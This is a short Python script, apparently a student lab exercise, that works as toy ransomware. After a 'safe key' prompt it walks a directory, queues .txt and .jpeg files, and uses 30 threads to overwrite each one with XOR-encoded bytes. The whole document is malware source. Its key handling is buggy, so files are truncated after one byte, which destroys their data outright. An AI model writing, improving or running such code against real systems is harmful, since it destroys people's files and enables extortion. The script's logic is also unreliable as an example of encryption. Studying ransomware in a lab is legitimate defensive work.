# import required module
import os
from queue import Queue
from threading import Thread

sss = input('Enter the safe key: ')
if sss != 'start':
    quit()


encry_ext = ['.txt', '.jpeg']
# assign directory
directory = '/Users/jithendranadh/Documents/CyberLabs/WOC/Ransomware/TEST'

# iterate over files in
# that directory
file_paths = []
for root, dirs, files in os.walk(directory):
    for pppp in files:
        file_path, file_ext = os.path.splitext(root +'/' + pppp)
        if file_ext in encry_ext:
            file_paths.append(file_path + file_ext)

original_key = 'a'


def encrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = 15
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                for byte in data:
                    xor_byte = chr(byte ^ ord(key[index]))
                    f.write(xor_byte)
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
        except Exception as e:
            print('failed to encrypt')
            print(e)

        q.task_done()


q = Queue()
for pppp in file_paths:
    q.put(pppp)
for i in range(30):
    thread = Thread(target=encrypt, daemon=True, args=original_key)
    thread.start()

q.join()

